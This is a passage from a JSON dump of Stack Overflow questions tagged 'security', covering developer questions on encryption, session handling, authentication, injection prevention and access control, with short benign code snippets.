&lt;/EventData&gt;\n&lt;/Event&gt;\n</code></pre>\n"},{"tags":["security","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12592250,"title":"Should ID's be encrypted fo AJAX calls?","body":"<p>I'm building an application that will do a lot through AJAX, and a lot of them will have to take in a userId, or documentid, photoid etc.</p>\n\n<p>What is considered best practice with these IDs, should they be encrypted(before even being put into the html page?), or is just sending them as is OK?</p>\n"},{"tags":["security","passwords","cracking"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":150,"score":0,"question_id":12578851,"title":"howsecureismypassword.com algorithm","body":"<p>There is a nice site <a href=\"http://www.howsecureismypassword.net/\" rel=\"nofollow\">http://www.howsecureismypassword.net/</a> which determines how long it will take to crack a password.</p>\n\n<p>What I want is to implement feature like this, so I need an algorithm for that</p>\n"},{"tags":["php","apache","security","shared-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12591547,"title":"Restrict PHP's file system access to a folder","body":"<p>My scenario: I have a shared hosting account running Apache that I use for personal projects. Now a friend of mine needs a little space to put up a website for his hockey club. I decided to let him run it on my account and to give him an FTP account that limits his access to public_html/hockey.</p>\n\n<p>My question: Is there a way to restrict his PHP scripts (in his hockey folder) in such a way that they couldn't access any files outside the hockey folder? I'm looking for a solution involving something like a configuration in php.ini or .htaccess. Please do not reply to tell me he should try not to access anything outside that folder. I'm trying to improve security against intentional access and accidental security holes in his code.</p>\n\n<p>If you know how to run his content in kind of a sandbox environment, any constructive input is greatly appreciated.</p>\n\n<p>Thanks, Simon</p>\n"},{"tags":["security","web-security","google-apps"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12591160,"title":"Google Domain Verification in Open Source Project","body":"<p>Are there any security concerns with checking in the google domain verification html file to an open source project? The site is hosted on heroku and all source is freely available on github to benefit the community.</p>\n"},{"tags":["c#",".net","security","encryption","credit-card"],"answer_count":10,"favorite_count":27,"up_vote_count":35,"down_vote_count":0,"view_count":7869,"score":35,"question_id":206438,"title":"Storing credit card details","body":"<p>I have a business requirement that forces me to store a customer's full credit card details (number, name, expiry date, CVV2) for a short period of time.</p>\n\n<p>Rationale: If a customer calls to order a product and their credit card is declined on the spot you are likely to lose the sale. If you take their details, thank them for the transaction and then find that the card is declined, you can phone them back and they are more likely to find another way of paying for the product. If the credit card is accepted you clear the details from the order.</p>\n\n<p>I cannot change this. The existing system stores the credit card details in clear text, and in the new system I am building to replace this I am clearly <em>not</em> going to replicate this!</p>\n\n<p>My question, then, is how I can securely store a credit card for a short period of time. I obviously want some kind of encryption, but what's the best way to do this?</p>\n\n<p>Environment: C#, WinForms, SQL-Server.</p>\n"},{"tags":["php","forms","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12590075,"title":"PHP Form processing","body":"<p>I've built a registration form, and I have implemented the jQuery Validation plugin by JRN ZAEFFERER, including stylizing the error messages with CSS, I want now to add a layer of PHP to validate a second time, in case JS is turned off then following that I will run the data through security : hash/salt/encryption etc, before inserting the data into a mySql table, then writing a program to get the account verified by email as part of the sign up process.</p>\n\n<p>I'm self-taught so can anyone with more experience explain the best practices with this process. Questions I have are : \nWhere should the PHP go, embed in the html file, in a seperate php file which the form action = \"\" submits to, or in an include file?\nWhat are the best practices as regards security, if I'm using a salt or a hash or an encrytion function should that be in an include file?\nThe final question is : Is jQuery validation a waste of time, would it be better just to do it with PHP, if you do both, does the PHP embed itself in a HTML file or is it better for security to put it elsewhere.</p>\n\n<p>This is the first time I've done this, but it's just simply taking input putting it in the database securely, verifying by email, and then logging in the new user to then go and use the website.</p>\n\n<p>I'd love to know best practices to begin with, so if there are any good articles on the web, please link me to them.</p>\n\n<p>Thanks </p>\n\n<p>Ant Power</p>\n"},{"tags":["c","security","web-applications"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":11367384,"title":"Static / Dynamic source code analysis","body":"<p>I took a class named \"Secure Code\", and in our next assignment we are supposed to do static / dynamic analysis of some C files and of a JavaEE Web Project.</p>\n\n<p>I checked out \"Source Monitor\" and ran it on the C files, but (unless I didn't get how to use it!) it doesn't seem to do what I'm looking for.</p>\n\n<p>Considering the topic, I'd be interested in knowing if there are tools for detecting \"insecure\" code, i.e. code that is potentially attackable through buffer overflows, SQL-Injections, XSS ... So I'd like it to point out which functions should be \"upgraded\" (e.g. fgets instead of gets, or a PreparedStatement instead of a normal SQL statement)</p>\n\n<p>Note: I'd prefer open source softwares, possibly for Windows (I have Ubuntu on a VM but I am not really good with it... I generally spend more time finding out how to configure the tools than running them).</p>\n\n<p>Thank you for your tips!</p>\n"},{"tags":["security","node.js","mongodb","mongoskin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12589442,"title":"How to protect against sql injection with url.parse","body":"<p>I am very new to node.js and mongodb. I have a page getting query strings with</p>\n\n<pre><code>var queries = url.parse(req.url,true).query;\n</code></pre>\n\n<p>and I write them into database using mongoskin module. Do I have to do something against sql injection?</p>\n"},{"tags":["python","security","python-2.7","xlib"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12588849,"title":"Python Xlib - Xlib.error.BadAccess on root.display.next_event()","body":"<p>Hey I've only really started Python and I decided to make program that catches certain keys, I found source online that captures mouseclicks and decided to start off with that, this is the code:</p>\n\n<pre><code>import Xlib\nimport Xlib.display\n\ndisplay = Xlib.display.Display(':0')\nroot = display.screen().root\nroot.change_attributes(event_mask = Xlib.X.ButtonPressMask | Xlib.X.ButtonReleaseMask)\n\nwhile True:\n    event = root.display.next_event()\n    print \"hi\"\n</code></pre>\n\n<p>This is the error get when I run it:</p>\n\n<pre><code>miles@miles:~/py/keynotify$ python x.py\nXlib.protocol.request.QueryExtension\nX protocol error:\n&lt;class 'Xlib.error.BadAccess'&gt;: code = 10, resource_id = 173, sequence_number = 9, major_opcode = 2, minor_opcode = 0\n^CTraceback (most recent call last):\n  File \"x.py\", line 9, in &lt;module&gt;\n    event = root.display.next_event()\n  File \"/usr/lib/pymodules/python2.7/Xlib/protocol/display.py\", line 171, in next_event\n    self.send_and_recv(event = 1)\n  File \"/usr/lib/pymodules/python2.7/Xlib/protocol/display.py\", line 502, in send_and_recv\nrs, ws, es = select.select([self.socket], writeset, [], timeout)\nKeyboardInterrupt\n</code></pre>\n\n<p>Would really appreciate any help!</p>\n"},{"tags":["c#","iphone","web-services","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12588312,"title":"Authorize Web Service Requests","body":"<p>We have built numerous web services and hosted them on our internal servers and these will be used by our iPhone application. End users of the iPhone app need not sign into the application, they can just use the app without any credentials.</p>\n\n<p>Whenever web services receive a request; I want to authorize that these requests are coming from iPhone app. How can i do this?</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security","passwords"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":91,"score":0,"question_id":12574701,"title":"hack safe authentication information database storage","body":"<p>In light of how many major websites have been hacked and their databases of password decrypted what is the best way to secure authentication?</p>\n\n<p>Basically I am interested in a way to secure access to a part of a site to members in a way that if hacked would under no circumstances let hackers get a hold of the user's passwords.</p>\n\n<p>Nothing is invulnerable but at least make it very difficult to crack.</p>\n"},{"tags":["security","mongodb"],"answer_count":5,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":496,"score":8,"question_id":4587523,"title":"MongoDB: is it safe to use document's ID \"in public\"? ","body":"<p>I really like MongoDB's automatically generated ids. They are really useful.</p>\n\n<p>However, is it save to use them publicly? </p>\n\n<p>Let's say there is a posts collection, and the /posts page that takes id paramater (something like /posts/4d901acd8df94c1fe600009b) and displays info about it.</p>\n\n<p>This way the user/hacker will know the real object id of the document. Is it okay or is it not secure?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","applet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12587836,"title":"Java Applet Security External Domain","body":"<p>I would like to use my own java ftp uploader between my servers however I can not figure out what is causing the connection issue. I looked at java.policy in target server. I have signed the jar files myself.</p>\n\n<p>My applet is working fine in Eclipse or under the same domain, but when I try to connect from a different URL it gets stuck at</p>\n\n<pre><code>ftp.connect(this.host,2121);\n\nftp.setRemoteVerificationEnabled(true);\nftp.enterLocalPassiveMode();\nftp.login(username, password);\n</code></pre>\n"},{"tags":["wcf","security","identity"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":583,"score":1,"question_id":302893,"title":"Passing the original caller in WCF","body":"<p>We currently have a setup like this:</p>\n\n<pre><code>lan\\john       lan\\application1    lan\\appService1      lan\\appService2 \nclient ------&gt; website ----------&gt; WCF Service1 ------&gt; WCF Service2\n</code></pre>\n\n<p>So each website/service runs as a different identity account that is setup in active directory. Security checks are based on the identity of the immediate caller (i.e. WCF Service2 would verify that its caller lan\\appService1 has the rights to perform that task).</p>\n\n<p>For logging purposes though we need to know who the original caller was (in this example lan\\john) so that we can record they did an action. I would like a way to do this in a more secure fashion than is currently being done (passing the string of \"lan\\john\" as a message header with each call). Any ideas?  </p>\n"},{"tags":["security","safari","privacy","safari-extension"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":521,"score":4,"question_id":3961424,"title":"How can a Safari extension know if Private Browsing mode is on?","body":"<p>I'm writing a Safari extension and want it to behave differently when the user turns on Private Browsing mode (I want to respect this private mode).</p>\n\n<p>I found no mention of this in Apple's docs.</p>\n\n<p>I'm aware of the discussion in this thread:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/2860879/detecting-if-a-browser-is-using-private-browsing-mode\">Detecting if a browser is using Private Browsing mode</a></p>\n\n<p>which suggests using a (browser-agnostic) js-CSS trick to detect private-browsing mode, but was hoping there's some hook built in to Safari that I could use for my extension.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["asp.net","security","dmz"],"answer_count":7,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":2712,"score":10,"question_id":4138167,"title":"Accessing data in internal production databases from a web server in DMZ","body":"<p>I'm working on an external web site (in DMZ) that needs to get data from our internal production database.</p>\n\n<p>All of the designs that I have come up with are rejected because the network department will not allow a connection of any sort (WCF, Oracle, etc.) to come inside from the DMZ.</p>\n\n<p>The suggestions that have come from the networking side generally fall under two categories -</p>\n\n<p>1) Export the required data to a server in the DMZ and export modified/inserted records eventually somehow, or </p>\n\n<p>2) Poll from inside, continually asking a service in the DMZ whether it has any requests that need serviced.</p>\n\n<p>I'm averse to suggestion 1 because I don't like the idea of a database sitting in the DMZ.  Option 2 seems like a ridiculous amount of extra complication for the nature of what's being done.</p>\n\n<p>Are these the only legitimate solutions?  Is there an obvious solution I'm missing?  Is the \"No connections in from DMZ\" decree practical?</p>\n\n<p>Edit: One line I'm constantly hearing is that \"no large company allows a web site to connect inside to get live production data.  That's why they send confirmation emails\".  Is that really how it works?</p>\n"},{"tags":["java","security","x509certificate","x509","certificates"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12582850,"title":"X509 serial number using java","body":"<p>I need to get some data from X509 certificate. </p>\n\n<p>If I open a certificate file in windows, its showing its serial number in this format.</p>\n\n<pre><code>ex. 39 65 70 eb d8 9f 28 20 4e c2 a0 6b 98 48 31 0d \n</code></pre>\n\n<p>The same data I am trying to obtain using java. After get it loaded, I use </p>\n\n<pre><code>x509.getSerialNumber();\nand result is : 76292708057987193002565060032465481997\n</code></pre>\n\n<p>So what is the difference between both of these ? I want the result as upper one. </p>\n"},{"tags":["php","security","session"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12583002,"title":"Protect PHP Session ID in Custom Handler","body":"<p>I have written a trivial custom session handler (in MySQL, but that's not relevant) which simply saves serialized session data, the session id, and the current time to a table.</p>\n\n<p>While the session exists, the session id is as valuable as a password for an attacker, which leads me to believe that I should be encrypting it in some way.</p>\n\n<p>Is it worthwhile to hash the session id before storing it in the database in order to force an attacker to bruteforce the session id to forge a cookie?</p>\n\n<p>My site already uses HTTPS for all connections.</p>\n"},{"tags":["android","security","encryption","ice-cream-sandwich","device-policy-manager"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":156,"score":1,"question_id":11880788,"title":"Android ICS Device Encryption","body":"<p>i'm trying to trigger the encryption of my ICS device programmatically by launching an intent <code>(Intent --&gt; DevicePolicyManager.ACTION_START_ENCRYPTION)</code>. This works quite well. I would like to know whether there is sent an broadcast or sth like that to recognize if the user clicked on \"encrypt device\" or declined the request.\nI need to notice the users decision. </p>\n\n<p>My second question concerns the method <code>setStorageEncryption(admin, boolean)</code>, which is implemented within the <code>DevicePolicyManager</code>. Does a call of <code>setStorageEncryption(admin, false)</code> has any impacts on the device encryption, if I afterwards launch the Encryption intent which is mentioned above?</p>\n\n<p>Kind regards</p>\n"},{"tags":["c#",".net","security","antivirus","malware-detection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12580964,"title":"Certificate to prove that our program is virus-free?","body":"<p>We are producing a software (C# / .NET 2.0), which is provided for download on a website. </p>\n\n<p>Now this is a special program for only a few clients. As a consequence, many antivirus programs (Norton, Mc Afee, Avira, ... ) do not know our program and bring up a false alarm (\"suspicious ...  \" -  \"not known by the community ... \"etc.). </p>\n\n<p>Many clients feel insecure, or do not know how to handle this.</p>\n\n<p>So, how can this be handled in general? Can we add some sort of \"certificate\" that our program is guaranteed to be virus-free ? </p>\n"},{"tags":["html","security"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":44,"score":-1,"question_id":12580153,"title":"Hide/Encrypt hidden form in HTML","body":"<p>I have created hidden form and it will be contain hidden input and javascript submit. But while form is submitted, user can view the source of page and will know all values of it. How can I hide this form or encrypt it so that user can not know values from even source of html.</p>\n"},{"tags":["c#","wpf","security","nosql","data-protection"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":112,"score":2,"question_id":12560283,"title":"Which NoSQL database can protect data?","body":"<p>I'm writing application on C# (WPF) for Windows. I need to store data for this application (in database, i think). But i need to secure this data (from modification). I'm planning to distribute this application, so filesystem protect doesn't fit for this situation. Also i wanna use NoSql database. My question is which NoSQL database support data protection and can be installed with minimum efforts as embedded with application database?</p>\n\n<p>Upd: So, which is the better Single user NoSQL DB, no security, for redistributable WPF application?</p>\n"},{"tags":["security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12577844,"title":"Symfony2: setting security.yml and use custom password encryption","body":"<p>I am trying to use a custom password encryptin in my symfony2 project.</p>\n\n<p>I have a problem with setting the security:</p>\n\n<pre><code>security:\n    encoders:\n    Symfony\\Component\\Security\\Core\\User\\User:\n      id: custom_encoder\n\n    providers:\n        main:\n            entity: { class: MDPI\\BackendBundle\\Entity\\Users, property: email }\n\n    firewalls:\n        main:\n            pattern:    ^/\n            anonymous: ~\n            form_login:\n                login_path:  /login\n                check_path:  /login_check\n\n\n    access_control:\n        - { path: /admin/.*, role: ROLE_ADMIN }\n        - { path: /.*, role: IS_AUTHENTICATED_ANONYMOUSLY }\n</code></pre>\n\n<p>Here, I am getting the exception:</p>\n\n<pre><code>InvalidConfigurationException: Unrecognized options \"main\" under \"security.encoders.providers\"\n</code></pre>\n\n<p>Any help is wellcome. Thanks a lot.</p>\n"},{"tags":["asp.net","security","c#-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":12577484,"title":"Secured And Unsecured Pages in Asp.net 4.0","body":"<p>I am developing a Web Applilcation in Asp.net 4.0 , wherein i have two types of Pages \"Secured\" and \"Unsecured\".</p>\n\n<p>To access Secure Pages, the user must successfully Login.</p>\n\n<p>This can be acheived in two ways:</p>\n\n<p>1st Approach : Location Tag in web.config file.</p>\n\n<p>2nd Approach : Make 2 virtual directories for Secured and Unsecured.</p>\n\n<p>Please suggest the better approach and also suggest ,if any other better option available.</p>\n\n<p>Thanks In Advance.....</p>\n"},{"tags":["security","symfony2","oauth-2.0","fosuserbundle","symfony-2.0"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12572904,"title":"Symfony2 security - Strange behavior (Challenging issue)","body":"<p>Using FOSOauthServerBundle, FOSUserBundle and Symfony2.0, I have followed <a href=\"http://blog.logicexception.com/2012/04/securing-syfmony2-rest-service-wiith.html\" rel=\"nofollow\">this documentation</a> (<a href=\"http://blog.logicexception.com/2012/04/securing-syfmony2-rest-service-wiith.html\" rel=\"nofollow\">http://blog.logicexception.com/2012/04/securing-syfmony2-rest-service-wiith.html</a>) about creating an own auth_login form when implementing OAuth2 with FOSOAuthServerBundle. Good post, by the way, from my humble point of view.</p>\n\n<p>I must say that I have it almost done. But there is a strange behavior that makes it not to work. Could anyone take a look at my problem and try to give me a clue about the possible solution??</p>\n\n<p>PREVIOUS CONSIDERATIONS</p>\n\n<p>Before developing the instructions at this page, I have the FOSOAuthServerBundle well configured. I complete the process, and I get the token properly, authentication the user credentials and creating the session too. The only thing is that I don't have a specific login form differenced from the main one in my web site. So the page that appears when trying to get the authorization code is the normal login one. What I want is, as described in the manual, to display a different login form, smaller and more specific, to make it friendly for mobile devices.</p>\n\n<p>THE PROBLEM</p>\n\n<p>Developing exactly what is described at this page, I get this behavior:</p>\n\n<ol>\n<li>I call \"^/oauth/v2/auth\" with the proper parameters</li>\n<li>As expected, I am redirected to the /auth_login page</li>\n<li>I input a user's credentials (correct login and password)</li>\n<li><p>After the login process, Symfony properly TRIES TO redirect again to \"^/oauth/v2/auth\" with the proper parameters, but, Surprise!!, some interceptor or something is catching that request and I am again redirected to /auth_login.</p>\n\n<ul>\n<li>The funny thing is that the session IS created (I mean, if in that moment I type any existing page in the site in the url bar, it redirects normally to the requested page with all the session and stuff created).\n** So the problem is just with the pattern \"^/oauth/v2/auth\". No matter whether I have or not created session, that it always will be intercepted and redirected to /auth_login (and, so, I don't get the workflow to go correctly in the way to finally get the token.</li>\n</ul></li>\n</ol>\n\n<p>THE ONLY DIFFERENCE</p>\n\n<p>Between what I have and what is described in the manual is just that I am using a twig page to display the auth_login form. I don't think this can be a problem, but anyway, I post it next:</p>\n\n<pre><code>&lt;form action=\"{{ path(\"acme_oauth_server_auth_login_check\") }}\" method=\"post\"&gt;\n    &lt;input type=\"hidden\" name=\"_csrf_token\" value=\"{{ csrf_token }}\" /&gt;\n\n    &lt;label for=\"username\"&gt;{{ 'security.login.username'|trans({}, 'FOSUserBundle') }}&lt;/label&gt;\n    &lt;input type=\"text\" id=\"username\" name=\"_username\" value=\"{{ last_username }}\" /&gt;\n\n    &lt;label for=\"password\"&gt;{{ 'security.login.password'|trans({}, 'FOSUserBundle') }}&lt;/label&gt;\n    &lt;input type=\"password\" id=\"password\" name=\"_password\" /&gt;\n\n    &lt;input type=\"checkbox\" id=\"remember_me\" name=\"_remember_me\" value=\"on\" /&gt;\n    &lt;label for=\"remember_me\"&gt;{{ 'security.login.remember_me'|trans({}, 'FOSUserBundle') }}&lt;/label&gt;\n\n    &lt;input type=\"submit\" id=\"_submit\" name=\"_submit\" value=\"{{ 'security.login.submit'|trans({}, 'FOSUserBundle') }}\" /&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>ONE MORE THING</p>\n\n<p>Although it doesn't work either, I am considering a trick (or workaround) that consists in putting the following in the action field of the form:</p>\n\n<pre><code>{{ path(\"fos_user_security_check\") }}\n</code></pre>\n\n<p>That means to make the /auth_login form to send the data to the same login_check used by FOSUserBundle instead of FOSOAuthServerBundle's.</p>\n\n<p>The effect in this case is as follows:</p>\n\n<ol>\n<li>I call \"^/oauth/v2/auth\" with the proper parameters</li>\n<li>As expected, I am redirected to the /auth_login page</li>\n<li>I input a user's credentials (correct login and password)</li>\n<li>After the login process, the redirection of ^/oauth/v2/auth is well performed and I get the authorization_code</li>\n<li>I complete the whole thing getting the access_token thanks to the ^/oauth/v2/token URL</li>\n<li>Surprise!! Although everything is done well, in this case the session IS NOT created, which is too bad for later calls to the API (the API just doesn't get anything as the session is not created). Imagine, for example a situation in which I want to get from the API a whole list of certain items that belong to the user that entered his or her credentials. Obviously, as the session is not created, all what I get is a redirection to the main page (it is thus how I have configured the firewall at symfony2).</li>\n</ol>\n\n<p>So everything so weird.</p>\n\n<p>I would really appreciate if someone could help me with all this.</p>\n\n<p>Thanks a lot</p>\n\n<p>Pedro</p>\n"},{"tags":["javascript","css","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12576525,"title":"Is using css display property to control what different levels of users could access a good idea?","body":"<p>my website requires users to login and I want to allow some users to access more information than others.  I use css display none property to set some of the items on the tab menu to not display depending who the user is. This way, they can't click on the tab to display the info. Is this a good way to restrict access to some materials on the website?  Is there a better way?  I'm using javascript and php.  Thanks.  </p>\n"},{"tags":["android","security","aes","public-key-encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12576463,"title":"Problems with sharing public key","body":"<p>I am using a client/server where I have given every client a public key in the application itself and at the start of any conversation between the client and server they share a AES key using this public/private key pair and then every thing is encrypted using this key ....</p>\n\n<p>I wanted to know what problems arise with this model....one would be the server cannot verify who is actually sending the data .digital signature ...but the user would later send it's credentials ....</p>\n\n<p>what can a MIM attack do here?</p>\n"},{"tags":["android","ios","security","token","password-protection"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12575989,"title":"How to create a password-less login for mobile app","body":"<p>I'm intested in building some kind of password-less login between a mobile app and an API (assuming I can control both). The motivation is that having to login is very annoying for users and has security risks (eg. users will reuse existing passwords) and I want the users to be able to get started with the app immediately.</p>\n\n<p>I'm wondering if there are some techniques that could work. For instance:</p>\n\n<ol>\n<li>Generate and random login/password on the mobile device and store the password in the keychain.</li>\n<li>Signup with the API using this login/password combination. This returns a token.</li>\n<li>Token is used in subsequent calls</li>\n</ol>\n\n<p>The drawbacks are:</p>\n\n<ul>\n<li>Login/passwords can be lost if user deletes app (this could maybe be mitigated by using iCloud to store the login - but that would be bad for the password?)</li>\n<li>Password is stored on the device (however it's in the keychain)</li>\n</ul>\n\n<p>So my questions: is something like this feasible and secure enough? Are there known techniques to do that? </p>\n"},{"tags":["android","security","google-api","google-play","subscription"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12572055,"title":"How to securely verify a user's subscription to an Android app?","body":"<p>I know very little about security or servers, but am making an Android app that allows users to purchase an in-app subscription. <a href=\"http://developer.android.com/guide/google/play/billing/billing_subscriptions.html#play-dev-api\" rel=\"nofollow\">As recommended</a>, I want to use the Google Play Developer API and store the necessary data on my own server. However, I can't think of a way to do this without having a line in my code like</p>\n\n<pre><code>if(userIsSubscribed){\n    //give access to purchased data\n}\n</code></pre>\n\n<p>A hacker could obviously go in and just flip that to <code>if(true)</code>. What should I do instead?</p>\n"},{"tags":["windows","security","mercurial","branch","acl"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":494,"score":3,"question_id":4090719,"title":"Mercurial - block access to a branch using ACL extension on Windows","body":"<p>I am trying to deny everyone commit access to a branch using ACL on Windows but can't quite seem to figure it out.  According to the little documentation I've found this should work.</p>\n\n<p>My hgrc file:</p>\n\n<pre><code>[extensions]\nhgext.acl=\n\n[hooks]\npretxncommit.acl = python:hgext.acl.hook\n\n[acl]\nsources = commit\n\n[acl.deny.branches] \ndefault = *\n</code></pre>\n\n<p>Shouldn't this deny everyone commit access to the default branch? I tried and now every commit, no matter the branch give:</p>\n\n<pre><code>error: pretxncommit.acl hook failed: config error - hook type \"pretxncommit\" can\nnot stop incoming changesets\ntransaction abort!\nrollback completed\nabort: config error - hook type \"pretxncommit\" cannot stop incoming changesets\n</code></pre>\n\n<p>Leads me to think I configured it wrong, but it's pretty much exactly how they do it in the AclExtension documentation @ <a href=\"http://mercurial.selenic.com/wiki/AclExtension\" rel=\"nofollow\">http://mercurial.selenic.com/wiki/AclExtension</a>.</p>\n"},{"tags":["web-services","security","socket.io","ws-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12575018,"title":"Socket.io Security Non-WebSocket Transports","body":"<p>I'm using socket.io to build a real-time secure web services API.\nWhen socket.io is setup to use a private key and certificate, it switches to the wss:// protocol instead of ws://. As I understand, wss implies that the connection is encrypted using TLS/SSL - But what happens if socket.io uses another transport type such as flashsocket or xhr polling? Will the connection be secure?</p>\n\n<p>Which transports supported by socket.io will automatically use encrypted connections when I specify a certificate and private key in my node.js server?</p>\n\n<p>Also, what is the general consensus on WebSocket security and more specifically - Socket.io's implementation of it?</p>\n"},{"tags":["c#","asp.net-mvc","security","forgot-password","password-recovery"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":129,"score":3,"question_id":12574595,"title":"How to create a password reset link?","body":"<p>Which way would you suggest to create a <strong>secure</strong> password reset link in <code>MVC</code> and <code>C#</code>? I mean, I'll create a <strong>random token</strong>, right? How do I encode it before to sending to user? Is <strong>MD5</strong> good enough? Do you know any other secure way?</p>\n"},{"tags":["php","security","post"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12574539,"title":"How to view where POSTDATA is being written to?","body":"<p>I'm security testing a website. My question is if you can view where POSTDATA is being written to, if so how?</p>\n\n<p>For example a site might have this as their post.php:</p>\n\n<pre><code>   $handle = fopen(\"filename.txt\", \"a\");\n   foreach($_POST as $variable =&gt; $value) {\n   fwrite($handle, $variable);\n   fwrite($handle, \"=\");\n   fwrite($handle, $value);\n   fwrite($handle, \"\\r\\n\");\n</code></pre>\n\n<p>What I am attempting to view is what the name of the txt file. In this case it is of course, filename. But, I need to first view the php, to find what the txt file name is. On the website I am testing I do not know the name of the txt file. As the name of the txt file is what I am trying to find.</p>\n\n<p>I have tried doing Curl -O sitename.com/postscript.php in terminal, but, it returnes 302.</p>\n\n<p>How can find the name of the txt file? (using any method)</p>\n\n<p>All help is very much appreciated.</p>\n\n<p>Update: I know for certain that the postdata is being saved to a php file on the root directory.</p>\n"},{"tags":["security","unix","directory","posix","mkdir"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12573920,"title":"What's a POSIX function for creating a temporary directory securely?","body":"<p>For the task of creating a temporary directory in <code>/tmp</code>,\nhow would one choose between <code>mkdtemp</code>, <code>mkstemp</code>, etc., for portable code?</p>\n"},{"tags":["java","web-services","security","rate-limiting"],"answer_count":3,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":120,"score":10,"question_id":12567777,"title":"How to limit web services usage in Java application?","body":"<p>Suppose I have a Java server application, which implements a few web services. Suppose also, I can authenticate application users.</p>\n\n<p>Now I would like to add some <em>limits per user</em> to the service usage: e.g. rate limit (requests per second), maximum request size, etc.</p>\n\n<p>Is there any \"ready-to-use\" library in Java to do that?</p>\n"},{"tags":["asp.net","asp.net-mvc","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12133327,"title":"Building an input text area to allow HTML but prevent security / script attacks","body":"<p>Platform: ASP.NET 4.0 MVC 4 C# jQuery</p>\n\n<p>Here's what I want to do.</p>\n\n<p>I'm building a simple forum for my product. I want to give users a text area to enter their posts or comments.</p>\n\n<ol>\n<li>I'd like to allow basic text formatting HTML and links - like p, a, b, i</li>\n<li>Don't want any other html styling - i.e. div, span, etc. etc.</li>\n<li>Don't want any scripting access</li>\n</ol>\n\n<p>Is there a clever way to do this? I could, for e.g., allow unsafe text and examine it on the server side but I doubt I'd be able to clean it up correctly and might open security holes.</p>\n\n<p>Preferably want to avoid heavy duty plugins.</p>\n\n<p>Thanks!</p>\n\n<p>(PS - my worst fallback is that I allow safe text only, i.e. keep the ASP.NET security on, and then use a special markup for links - like [link] [b] [i])</p>\n"},{"tags":["android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":394,"score":1,"question_id":6074091,"title":"Android lockNow() fails on HTC Desire","body":"<p>I have created an app that can lock the phone with a pin code using DevicePolicyManager, resetPassword and lockNow(). It works perfectly on my Galaxy S and on all other phones but not on HTC Desire.</p>\n\n<p>On a Desire the pin code screen appears but you can simply press the ok button without entering the pin code and the phone will still unlock.</p>\n\n<p>A user says that the lock works if he does not use the phone for about 5 minutes. Does anyone have a hint of what could be wrong, or any suggestion of what to do?</p>\n"},{"tags":["objective-c","cocoa","security","osx-mountain-lion","keychain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12503708,"title":"Whats the Correct Way to Prompt a User for their Password?","body":"<p>This is a follow up to this <a href=\"http://stackoverflow.com/questions/12450866/am-i-allowed-to-ask-for-and-store-a-users-itunesconnect-password\">question</a>. </p>\n\n<p>If I'm going to store a user's username and password with Keychain Services, should I simply create my own prompt view with an NSSecureTextField for the password, and then once the user enters their info pass it to a Keychain Services API (<a href=\"https://github.com/samsoffes/sskeychain\" 